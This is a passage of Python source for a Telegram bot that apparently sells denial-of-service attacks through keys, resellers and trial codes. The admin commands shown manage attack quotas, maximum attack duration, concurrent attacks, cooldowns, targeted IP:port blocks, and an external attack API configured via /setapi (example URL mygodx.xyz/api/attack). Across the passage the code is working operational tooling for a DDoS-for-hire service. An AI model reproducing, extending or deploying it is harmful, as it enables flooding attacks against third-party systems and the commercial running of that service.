        
    except Exception as e:
        logger.error(f"Error in gentrial command: {e}")
        log_error(e, user_id=message.from_user.id, command="gentrial")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= GENTRIALFOR COMMAND =================
@bot.message_handler(commands=['gentrialfor'])
def gentrialfor_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, 
                        "⚠️ <b>Usage:</b> /gentrialfor &lt;reseller_id&gt; &lt;hours&gt; &lt;count&gt;\n\n"
                        "Example: /gentrialfor 123456789 24 5\n\n"
                        "📋 <b>Parameters:</b>\n"
                        "• reseller_id: Reseller's user ID\n"
                        "• hours: Validity in hours (1-72)\n"
                        "• count: Number of keys (1-50)")
            return
        
        try:
            reseller_id = int(parts[1])
            hours = int(parts[2])
            count = int(parts[3])
        except ValueError:
            bot.reply_to(message, "❌ All parameters must be numbers.")
            return
        
        if hours < 1 or hours > 72:
            bot.reply_to(message, "❌ Hours must be between 1 and 72.")
            return
        
        if count < 1 or count > 50:
            bot.reply_to(message, "❌ Count must be between 1 and 50.")
            return
        
        if not is_reseller(reseller_id):
            bot.reply_to(message, f"⚠️ User {reseller_id} is not a reseller.")
            return
        
        expires = datetime.now() + timedelta(hours=hours)
        codes = []
        
        for i in range(count):
            code = generate_code("TRIAL", 10)
            keys_col.insert_one({
                "_id": code,
                "type": "trial",
                "attacks_left": 3,
                "max_duration": 120,
                "cooldown": 60,
                "expires": expires.isoformat(),
                "created_by": message.from_user.id,
                "redeemed_by": None,
                "redeemed_at": None,
                "trial": True,
                "created_at": datetime.now().isoformat(),
                "duration_hours": hours,
                "prefix": "TRIAL",
                "reseller_id": reseller_id
            })
            codes.append(code)
            log_key_event("generated_trial_for_reseller", code, created_by=message.from_user.id, extra=f"reseller={reseller_id}, hours={hours}")
        
        code_list = "\n".join([f"<code>{code}</code>" for code in codes])
        
        log_admin_action(message.from_user.id, "gentrialfor", f"Generated {count} trial keys for reseller {reseller_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>Trial Keys Generated for Reseller</b>\n\n"
                    f"💰 <b>Reseller:</b> <code>{reseller_id}</code>\n"
                    f"📏 <b>Count:</b> {count}\n"
                    f"⏳ <b>Validity:</b> {hours} hours\n"
                    f"📅 <b>Expires:</b> {format_expiry(expires)}\n"
                    f"🎯 <b>Attacks per key:</b> 3 (Limited)\n\n"
                    f"━━━━━━━ <b>KEYS</b> ━━━━━━━\n"
                    f"{code_list}\n\n"
                    f"💡 Users redeem with: /redeem CODE")
        
        try:
            bot.send_message(reseller_id, 
                           f"✅ <b>Trial Keys Received</b>\n\n"
                           f"📏 <b>Count:</b> {count}\n"
                           f"⏳ <b>Validity:</b> {hours} hours\n"
                           f"🔑 <b>Keys:</b>\n{code_list}")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in gentrialfor command: {e}")
        log_error(e, user_id=message.from_user.id, command="gentrialfor")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= DELETETRIALS COMMAND =================
@bot.message_handler(commands=['deletetrials'])
def deletetrials_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        result = keys_col.delete_many({"trial": True, "redeemed_by": None})
        
        log_admin_action(message.from_user.id, "deletetrials", f"Deleted {result.deleted_count} trial keys")
        
        bot.reply_to(message, 
                    f"✅ <b>Trial Keys Deleted</b>\n\n"
                    f"🗑 Deleted: {result.deleted_count} trial keys\n\n"
                    f"All unredeemed trial keys have been removed.")
        
    except Exception as e:
        logger.error(f"Error in deletetrials command: {e}")
        log_error(e, user_id=message.from_user.id, command="deletetrials")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= LIST CODES COMMAND =================@bot.message_handler(commands=['list_codes'])
def list_codes_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        keys = list(keys_col.find({"redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}}).limit(50))
        
        if not keys:
            bot.reply_to(message, "📋 No active codes available.")
            return
        
        text = "🔑 <b>Active Codes</b>\n\n"
        
        for i, key in enumerate(keys, 1):
            code = key["_id"]
            key_type = key.get("type", "standard")
            expires = key.get("expires", "Unknown")
            created_by = key.get("created_by", "Unknown")
            attacks = key.get("attacks_left", "Unlimited")
            
            if attacks == -1:
                attacks = "♾️ Unlimited"
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ Code: <code>{code}</code>\n"
                f"├ Type: {key_type}\n"
                f"├ Attacks: {attacks}\n"
                f"├ Expires: {expires[:10] if expires != 'Unknown' else 'Unknown'}\n"
                f"├ Created by: {created_by}\n"
                f"└ {'─' * 30}\n\n"
            )
        
        if len(keys) >= 50:
            text += "\n⚠️ Showing first 50 codes. Use specific queries for more."
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in list_codes command: {e}")
        log_error(e, user_id=message.from_user.id, command="list_codes")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= BLOCK CODE COMMAND =================
@bot.message_handler(commands=['block_code'])
def block_code_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /block_code &lt;code&gt;")
            return
        
        code = parts[1].upper()
        
        key = keys_col.find_one({"_id": code})
        if not key:
            bot.reply_to(message, f"❌ Code {code} not found.")
            return
        
        if key.get("redeemed_by"):
            bot.reply_to(message, f"⚠️ Code {code} has already been redeemed. Cannot block.")
            return
        
        blocked_codes_col.insert_one({"_id": code, "blocked_by": message.from_user.id, "blocked_at": datetime.now().isoformat()})
        keys_col.delete_one({"_id": code})
        
        log_admin_action(message.from_user.id, "block_code", f"Blocked code {code}")
        
        bot.reply_to(message, 
                    f"🚫 <b>Code Blocked</b>\n\n"
                    f"Code: <code>{code}</code>\n"
                    f"Blocked by: {message.from_user.id}\n"
                    f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"This code can no longer be redeemed.")
        
    except Exception as e:
        logger.error(f"Error in block_code command: {e}")
        log_error(e, user_id=message.from_user.id, command="block_code")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= KEY STATE COMMAND =================
@bot.message_handler(commands=['key_state'])
def key_state_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /key_state &lt;code&gt;")
            return
        
        code = parts[1].upper()
        
        key = keys_col.find_one({"_id": code})
        if not key:
            bot.reply_to(message, f"❌ Code {code} not found.")
            return
        
        is_blocked = blocked_codes_col.count_documents({"_id": code}) > 0
        
        status = "✅ Active"
        if is_blocked:
            status = "🚫 Blocked"
        elif key.get("redeemed_by"):
            status = "✅ Redeemed"
        elif datetime.now() > datetime.fromisoformat(key["expires"]):
            status = "⏰ Expired"
        
        redeemed_by = key.get("redeemed_by", "Not redeemed")
        redeemed_at = key.get("redeemed_at", "Not redeemed")
        
        text = (
            f"🔑 <b>Key State</b>\n"
            f"╔════════════════════════╗\n"
            f"║   🔑 KEY DETAILS       ║\n"
            f"╚════════════════════════╝\n\n"
            f"📋 <b>Code:</b> <code>{code}</code>\n"
            f"📊 <b>Status:</b> {status}\n"
            f"📝 <b>Type:</b> {key.get('type', 'standard')}\n"
            f"🎯 <b>Attacks:</b> {key.get('attacks_left', 'Unlimited')}\n"
            f"⏱ <b>Max Duration:</b> {key.get('max_duration', 0)}s\n"
            f"⏳ <b>Cooldown:</b> {key.get('cooldown', 0)}s\n"
            f"📅 <b>Expires:</b> {format_expiry(datetime.fromisoformat(key['expires'])) if key.get('expires') else 'Unknown'}\n"
            f"👤 <b>Created by:</b> {key.get('created_by', 'Unknown')}\n"
            f"👤 <b>Redeemed by:</b> {redeemed_by}\n"
            f"🕒 <b>Redeemed at:</b> {redeemed_at}\n"
            f"🔒 <b>Blocked:</b> {'✅ Yes' if is_blocked else '❌ No'}"
        )
        
        bot.reply_to(message, text)
        
    except Exception as e:
        logger.error(f"Error in key_state command: {e}")
        log_error(e, user_id=message.from_user.id, command="key_state")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= OWNER PANEL =================
@bot.message_handler(commands=['owner'])
def owner_panel(message):
    try:
        user_id = message.from_user.id
        
        if not is_admin_or_owner(user_id):
            bot.reply_to(message, "❌ Unauthorized access.")
            return
        
        title = "👑 OWNER PANEL" if is_owner(user_id) else "👮 ADMIN PANEL"
        
        stats = (
            f"📊 <b>Quick Stats:</b>\n"
            f"• Active Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks')}\n"
            f"• Approved Groups: {groups_col.count_documents({})}\n"
            f"• Active Users: {plans_col.count_documents({'expires': {'$gt': datetime.now().isoformat()}})}\n"
            f"• Resellers: {resellers_col.count_documents({})}\n"
            f"• Admins: {admins_col.count_documents({})}\n"
            f"• Banned Users: {bans_col.count_documents({})}\n"
            f"• Pending Feedback: {get_pending_feedback_count()}\n"
        )
        
        panel_text = (
            f"{title}\n\n"
            f"{stats}\n"
            f"━━━━━━━ <b>COMMANDS</b> ━━━━━━━\n\n"
            f"🔹 <b>Admin Management (Owner only):</b>\n"
            f"/addadmin /removeadmin /admins /adminlogs\n\n"
            f"🔹 <b>Group Management:</b>\n"
            f"/approve /disapprove /approved_groups\n\n"
            f"🔹 <b>User Management:</b>\n"
            f"/ban /unban /banned_list /users /remove /remove_expired\n"
            f"/reset_user /get_user_info /set_user_limit\n\n"
            f"🔹 <b>Reseller System:</b>\n"
            f"/add_reseller /remove_reseller /resellers /addcredit /removecredit\n"
            f"/reseller_info\n\n"
            f"🔹 <b>Key Management:</b>\n"
            f"/genkey /gentrial /gentrialfor /deletetrials /list_codes\n"
            f"/delete_code /block_code /key_state\n\n"
            f"🔹 <b>Settings:</b>\n"
            f"/settime /setcooldown /setconcurrent /setapi\n"
            f"/port_protection /feedback /maintenance\n"
            f"/block_port /unblock_port /blocked_ports\n\n"
            f"🔹 <b>Feedback Management:</b>\n"
            f"/view_feedback - View pending feedback\n"
            f"/review_feedback &lt;id&gt; - Mark as reviewed\n"
            f"/feedback_stats - Feedback statistics\n\n"
            f"🔹 <b>Utilities:</b>\n"
            f"/state /server_stats /broadcast /backup_users /export_data\n"
            f"/extend_all_users /deduct_all\n\n"
            f"🔹 <b>Attack & Status:</b>\n"
            f"/attack /status /ping /getid /report\n\n"
            f"💡 Use /help for detailed command descriptions"
        )
        
        bot.reply_to(message, panel_text)
        
    except Exception as e:
        logger.error(f"Error in owner command: {e}")
        log_error(e, user_id=message.from_user.id, command="owner")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= FEEDBACK COMMAND =================
@bot.message_handler(commands=['feedback'])
def feedback_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /feedback on/off")
            return
        
        status = parts[1].lower()
        if status == "on":
            update_setting("feedback_system", True)
            update_setting("feedback_require_image", True)
            bot.reply_to(message, "✅ <b>Feedback System Enabled</b>\n\n"
                        "Users will be required to submit a screenshot/image after each attack.\n"
                        "They cannot start new attacks until they submit feedback.")
            log_admin_action(message.from_user.id, "feedback", "Enabled with image requirement")
        elif status == "off":
            update_setting("feedback_system", False)
            update_setting("feedback_require_image", False)
            pending_feedback_col.delete_many({})
            bot.reply_to(message, "❌ <b>Feedback System Disabled</b>\n\n"
                        "All pending feedback has been cleared.\n"
                        "Users can attack without submitting feedback.")
            log_admin_action(message.from_user.id, "feedback", "Disabled")
        else:
            bot.reply_to(message, "⚠️ Please specify 'on' or 'off'.")
            
    except Exception as e:
        logger.error(f"Error in feedback command: {e}")
        log_error(e, user_id=message.from_user.id, command="feedback")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= DEDUCT ALL COMMAND =================
@bot.message_handler(commands=['deduct_all'])
def deduct_all_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /deduct_all &lt;seconds&gt;\n\nDeducts time from all active user plans.")
            return
        
        try:
            seconds = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid seconds. Please provide a number.")
            return
        
        if seconds <= 0:
            bot.reply_to(message, "❌ Seconds must be positive.")
            return
        
        users = list(plans_col.find({}))
        count = 0
        
        for user in users:
            try:
                expires = datetime.fromisoformat(user["expires"])
                new_expires = expires - timedelta(seconds=seconds)
                
                if new_expires < datetime.now():
                    plans_col.delete_one({"_id": user["_id"]})
                else:
                    plans_col.update_one(
                        {"_id": user["_id"]},
                        {"$set": {"expires": new_expires.isoformat()}}
                    )
                count += 1
            except Exception as e:
                logger.error(f"Error deducting time for user {user.get('_id')}: {e}")
        
        log_admin_action(message.from_user.id, "deduct_all", f"Deducted {seconds}s from {count} users")
        
        bot.reply_to(message, 
                    f"✅ <b>Time Deducted Successfully</b>\n\n"
                    f"📊 Users Affected: {count}\n"
                    f"⏱ Time Deducted: {format_duration(seconds)}\n"
                    f"🕒 Total users processed: {len(users)}")
        
    except Exception as e:
        logger.error(f"Error in deduct_all command: {e}")
        log_error(e, user_id=message.from_user.id, command="deduct_all")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= EXTEND ALL USERS COMMAND =================
@bot.message_handler(commands=['extend_all_users'])
def extend_all_users_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /extend_all_users &lt;seconds&gt;\n\nExtends all active user plans by specified seconds.")
            return
        
        try:
            seconds = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid seconds. Please provide a number.")
            return
        
        if seconds <= 0:
            bot.reply_to(message, "❌ Seconds must be positive.")
            return
        
        users = list(plans_col.find({}))
        count = 0
        
        for user in users:
            try:
                expires = datetime.fromisoformat(user["expires"])
                new_expires = expires + timedelta(seconds=seconds)
                
                plans_col.update_one(
                    {"_id": user["_id"]},
                    {"$set": {"expires": new_expires.isoformat()}}
                )
                count += 1
            except Exception as e:
                logger.error(f"Error extending user {user.get('_id')}: {e}")
        
        log_admin_action(message.from_user.id, "extend_all_users", f"Extended {count} users by {seconds}s")
        
        bot.reply_to(message, 
                    f"✅ <b>All Users Extended</b>\n\n"
                    f"📊 Users Extended: {count}\n"
                    f"⏱ Time Added: {format_duration(seconds)}\n"
                    f"🕒 Total users processed: {len(users)}")
        
    except Exception as e:
        logger.error(f"Error in extend_all_users command: {e}")
        log_error(e, user_id=message.from_user.id, command="extend_all_users")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= EXPORT DATA COMMAND =================
@bot.message_handler(commands=['export_data'])
def export_data_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        status_msg = bot.reply_to(message, "📤 <b>Exporting data...</b>\n\nPlease wait, this may take a moment.")
        
        export_data = {
            "export_time": datetime.now().isoformat(),
            "exported_by": str(message.from_user.id),
            "settings": settings_col.find_one({}),
            "admins": list(admins_col.find({})),
            "resellers": list(resellers_col.find({})),
            "approved_groups": list(groups_col.find({})),
            "group_limits": list(limits_col.find({})),
            "banned_users": list(bans_col.find({})),
            "user_plans": list(plans_col.find({})),
            "keys": list(keys_col.find({})),
            "blocked_codes": list(blocked_codes_col.find({})),
            "known_users": list(known_users_col.find({})),
            "active_attacks": list(active_attacks.values()),
            "stats": bot_stats_col.find_one({"_id": "stats"}),
            "feedback_submissions": list(feedback_submissions_col.find({})),
            "pending_feedback": list(pending_feedback_col.find({}))
        }
        
        for key in export_data.get("keys", []):
            if "api_key" in key:
                key["api_key"] = "***HIDDEN***"
        
        filename = f"bot_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2, default=str)
        
        with open(filename, 'rb') as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"📊 <b>Data Export</b>\n\n"
                        f"📅 Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"👤 Exported by: {message.from_user.id}\n"
                        f"📦 File size: {os.path.getsize(filename) / 1024:.2f} KB"
            )
        
        os.remove(filename)
        
        log_admin_action(message.from_user.id, "export_data", "Full data export")
        
        bot.edit_message_text(
            "✅ <b>Export Complete!</b>\n\n"
            "📊 Data file has been sent to this chat.",
            chat_id=message.chat.id,
            message_id=status_msg.message_id
        )
        
    except Exception as e:
        logger.error(f"Error in export_data command: {e}")
        log_error(e, user_id=message.from_user.id, command="export_data")
        bot.reply_to(message, "❌ An error occurred during export. Please try again.")

# ================= BACKUP USERS COMMAND =================
@bot.message_handler(commands=['backup_users'])
def backup_users_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        status_msg = bot.reply_to(message, "📤 <b>Backing up users...</b>")
        
        users_data = []
        for user in plans_col.find({}):
            users_data.append({
                "user_id": user.get("_id"),
                "plan_type": user.get("plan_type", "standard"),
                "expires": user.get("expires"),
                "max_duration": user.get("max_duration"),
                "cooldown": user.get("cooldown"),
                "redeemed_code": user.get("redeemed_code"),
                "redeemed_at": user.get("redeemed_at")
            })
        
        resellers_data = list(resellers_col.find({}))
        
        backup_data = {
            "backup_time": datetime.now().isoformat(),
            "users_count": len(users_data),
            "resellers_count": len(resellers_data),
            "users": users_data,
            "resellers": resellers_data
        }
        
        filename = f"user_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(backup_data, f, indent=2, default=str)
        
        with open(filename, 'rb') as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"👥 <b>User Backup</b>\n\n"
                        f"📅 Backed up: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"👤 Users: {len(users_data)}\n"
                        f"💰 Resellers: {len(resellers_data)}"
            )
        
        os.remove(filename)
        
        log_admin_action(message.from_user.id, "backup_users", f"Backed up {len(users_data)} users")
        
        bot.edit_message_text(
            f"✅ <b>Backup Complete!</b>\n\n"
            f"👤 Users backed up: {len(users_data)}\n"
            f"💰 Resellers: {len(resellers_data)}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id
        )
        
    except Exception as e:
        logger.error(f"Error in backup_users command: {e}")
        log_error(e, user_id=message.from_user.id, command="backup_users")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= SERVER STATS COMMAND =================
@bot.message_handler(commands=['server_stats'])
def server_stats_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        process = psutil.Process()
        memory_used = process.memory_info().rss / 1024 / 1024
        cpu_used = process.cpu_percent(interval=1)
        
        active_attacks = get_active_attack_count()
        total_users = plans_col.count_documents({})
        active_users = plans_col.count_documents({"expires": {"$gt": datetime.now().isoformat()}})
        total_groups = groups_col.count_documents({})
        total_resellers = resellers_col.count_documents({})
        pending_feedback = get_pending_feedback_count()
        
        stats_text = (
            f"🖥️ <b>SERVER STATISTICS</b>\n"
            f"╔══════════════════════════════╗\n"
            f"║   📊 SYSTEM MONITOR         ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"━━━━━━━ <b>SYSTEM</b> ━━━━━━━\n"
            f"🖥️ <b>Platform:</b> {platform.system()} {platform.release()}\n"
            f"🐍 <b>Python:</b> {platform.python_version()}\n"
            f"⚡ <b>CPU Usage:</b> {cpu_percent}%\n"
            f"💾 <b>RAM Usage:</b> {memory.percent}% ({memory.used / 1024**3:.1f}GB / {memory.total / 1024**3:.1f}GB)\n"
            f"💿 <b>Disk Usage:</b> {disk.percent}% ({disk.used / 1024**3:.1f}GB / {disk.total / 1024**3:.1f}GB)\n\n"
            f"━━━━━━━ <b>PROCESS</b> ━━━━━━━\n"
            f"🧵 <b>Process Memory:</b> {memory_used:.1f} MB\n"
            f"⚡ <b>Process CPU:</b> {cpu_used}%\n"
            f"🔄 <b>Threads:</b> {process.num_threads()}\n"
            f"🆙 <b>Process Uptime:</b> {format_duration(int(time.time() - process.create_time()))}\n\n"
            f"━━━━━━━ <b>BOT</b> ━━━━━━━\n"
            f"🔥 <b>Active Attacks:</b> {active_attacks}\n"
            f"👤 <b>Total Users:</b> {total_users}\n"
            f"✅ <b>Active Users:</b> {active_users}\n"
            f"👥 <b>Approved Groups:</b> {total_groups}\n"
            f"💰 <b>Resellers:</b> {total_resellers}\n"
            f"📸 <b>Pending Feedback:</b> {pending_feedback}"
        )
        
        bot.reply_to(message, stats_text)
        
    except Exception as e:
        logger.error(f"Error in server_stats command: {e}")
        log_error(e, user_id=message.from_user.id, command="server_stats")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= SET API COMMAND =================
@bot.message_handler(commands=['setapi'])
def set_api_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /setapi &lt;api_url&gt; &lt;api_key&gt;\n\n"
                        "Example: /setapi https://mygodx.xyz/api/attack YOUR_API_KEY")
            return
        
        api_url = parts[1]
        api_key = parts[2]
        
        if not api_url.startswith(('http://', 'https://')):
            api_url = 'https://' + api_url
        
        update_setting("api_url", api_url)
        update_setting("api_key", api_key)
        
        log_admin_action(message.from_user.id, "setapi", f"API URL: {api_url}")
        
        bot.reply_to(message, 
                    f"✅ <b>API Settings Updated</b>\n\n"
                    f"📡 URL: <code>{api_url}</code>\n"
                    f"🔑 Key: <code>{api_key[:10]}...{api_key[-4:]}</code>\n\n"
                    f"✅ Configuration saved successfully!")
        
    except Exception as e:
        logger.error(f"Error in setapi command: {e}")
        log_error(e, user_id=message.from_user.id, command="setapi")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= SET CONCURRENT COMMAND =================
@bot.message_handler(commands=['setconcurrent'])
def set_concurrent_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /setconcurrent &lt;number&gt;\n\n"
                        "Example: /setconcurrent 10\n"
                        "Max allowed: 50")
            return
        
        try:
            value = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number.")
            return
        
        if value < 1 or value > 50:
            bot.reply_to(message, "❌ Value must be between 1 and 50.")
            return
        
        old_value = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
        update_setting("max_concurrent_attacks", value)
        
        log_admin_action(message.from_user.id, "setconcurrent", f"Changed from {old_value} to {value}")
        
        bot.reply_to(message, 
                    f"✅ <b>Concurrent Attacks Updated</b>\n\n"
                    f"📊 Old value: {old_value}\n"
                    f"📊 New value: {value}\n\n"
                    f"⚡ Bot can now handle {value} simultaneous attacks.")
        
    except Exception as e:
        logger.error(f"Error in setconcurrent command: {e}")
        log_error(e, user_id=message.from_user.id, command="setconcurrent")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= SET TIME COMMAND =================
@bot.message_handler(commands=['settime'])
def set_time_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /settime &lt;seconds&gt;\n\n"
                        "Example: /settime 300\n"
                        "Max allowed: 400s")
            return
        
        try:
            value = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number.")
            return
        
        if value < 30 or value > 400:
            bot.reply_to(message, "❌ Value must be between 30 and 400 seconds.")
            return
        
        old_value = get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)
        update_setting("max_attack_time", value)
        
        log_admin_action(message.from_user.id, "settime", f"Changed from {old_value} to {value}")
        
        bot.reply_to(message, 
                    f"✅ <b>Max Attack Time Updated</b>\n\n"
                    f"⏱ Old value: {old_value}s\n"
                    f"⏱ New value: {value}s\n\n"
                    f"⚡ Users can now attack for up to {value}s.")
        
    except Exception as e:
        logger.error(f"Error in settime command: {e}")
        log_error(e, user_id=message.from_user.id, command="settime")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= SET COOLDOWN COMMAND =================
@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /setcooldown &lt;seconds&gt;\n\n"
                        "Example: /setcooldown 60")
            return
        
        try:
            value = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number.")
            return
        
        if value < 10 or value > 300:
            bot.reply_to(message, "❌ Value must be between 10 and 300 seconds.")
            return
        
        old_value = get_setting("cooldown", DEFAULT_COOLDOWN)
        update_setting("cooldown", value)
        
        log_admin_action(message.from_user.id, "setcooldown", f"Changed from {old_value} to {value}")
        
        bot.reply_to(message, 
                    f"✅ <b>Global Cooldown Updated</b>\n\n"
                    f"⏳ Old value: {old_value}s\n"
                    f"⏳ New value: {value}s\n\n"
                    f"⚡ Users will wait {value}s between attacks.")
        
    except Exception as e:
        logger.error(f"Error in setcooldown command: {e}")
        log_error(e, user_id=message.from_user.id, command="setcooldown")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= MAINTENANCE COMMAND =================
@bot.message_handler(commands=['maintenance'])
def maintenance_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /maintenance on/off")
            return
        
        status = parts[1].lower()
        current_status = get_setting("maintenance_mode", False)
        
        if status == "on":
            update_setting("maintenance_mode", True)
            update_setting("maintenance_start_time", datetime.now().isoformat())
            bot.reply_to(message, "🛠️ <b>Maintenance Mode Enabled</b>\n\n"
                        "The bot is now in maintenance mode.\n"
                        "Only the owner can use the bot.\n"
                        "Users will see a maintenance message.")
            log_admin_action(message.from_user.id, "maintenance", "Enabled")
        elif status == "off":
            update_setting("maintenance_mode", False)
            update_setting("maintenance_start_time", None)
            bot.reply_to(message, "✅ <b>Maintenance Mode Disabled</b>\n\n"
                        "The bot is now fully operational.\n"
                        "All users can access the bot again.")
            log_admin_action(message.from_user.id, "maintenance", "Disabled")
        else:
            bot.reply_to(message, "⚠️ Please specify 'on' or 'off'.")
            
    except Exception as e:
        logger.error(f"Error in maintenance command: {e}")
        log_error(e, user_id=message.from_user.id, command="maintenance")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= UNBLOCK PORT COMMAND =================
@bot.message_handler(commands=['unblock_port'])
def unblock_port_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /unblock_port &lt;ip&gt; &lt;port&gt;\n\n"
                        "Example: /unblock_port 192.168.1.1 8080")
            return
        
        target = parts[1]
        try:
            port = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ Invalid port number.")
            return
        
        if not validate_target(target):
            bot.reply_to(message, "❌ Invalid IP address.")
            return
        
        if not validate_port(port):
            bot.reply_to(message, "❌ Invalid port (must be 1-65535).")
            return
        
        key = f"{target}:{port}"
        
        blocked = settings_col.find_one({"_id": "blocked_ports"}) or {}
        if key not in blocked:
            bot.reply_to(message, f"⚠️ {key} is not blocked.")
            return
        
        settings_col.update_one(
            {"_id": "blocked_ports"}, 
            {"$unset": {key: ""}}
        )
        
        log_admin_action(message.from_user.id, "unblock_port", f"Unblocked {key}")
        
        bot.reply_to(message, 
                    f"✅ <b>Port Unblocked</b>\n\n"
                    f"🎯 Target: {target}:{port}\n"
                    f"🕒 Unblocked at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"✅ Users can now attack this target.")
        
    except Exception as e:
        logger.error(f"Error in unblock_port command: {e}")
        log_error(e, user_id=message.from_user.id, command="unblock_port")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= BLOCK PORT COMMAND =================
@bot.message_handler(commands=['block_port'])
def block_port_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /block_port &lt;ip&gt; &lt;port&gt;\n\n"
                        "Example: /block_port 192.168.1.1 8080")
            return
        
        target = parts[1]
        try:
            port = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ Invalid port number.")
            return
        
        if not validate_target(target):
            bot.reply_to(message, "❌ Invalid IP address.")
            return
        
        if not validate_port(port):
            bot.reply_to(message, "❌ Invalid port (must be 1-65535).")
            return
        
        key = f"{target}:{port}"
